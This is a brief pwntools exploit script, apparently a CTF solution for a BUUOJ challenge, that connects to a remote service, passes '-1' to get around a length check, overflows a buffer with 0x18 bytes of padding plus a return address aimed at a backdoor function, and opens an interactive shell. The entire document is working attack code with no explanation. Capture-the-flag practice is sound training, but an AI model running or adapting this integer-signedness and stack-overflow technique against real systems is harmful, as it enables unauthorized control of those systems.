from pwn import *

backdoor_addr = 0x400726
r = remote('node3.buuoj.cn', 27170)
r.recvuntil('name:\n')
r.sendline('-1')
r.recvuntil('name?\n')
r.send('a' * 0x18 + p64(backdoor_addr))
r.interactive()
